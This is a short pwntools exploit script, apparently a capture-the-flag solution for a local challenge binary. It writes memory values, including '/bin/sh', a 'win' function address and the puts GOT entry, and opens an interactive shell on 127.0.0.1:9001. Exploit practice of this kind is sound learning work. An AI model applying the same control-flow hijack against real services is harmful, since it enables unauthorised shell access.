#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("127.0.0.1", 9001)

BUBBLEWRAP = 0x00000000004011dd

p.sendline(str(int.from_bytes(b"/bin/sh\x00", byteorder="little")).encode())
p.sendline(str(elf.sym["win"]+5).encode())
p.sendline(str(BUBBLEWRAP).encode())
p.sendline(str(elf.got["puts"]).encode())

p.interactive()
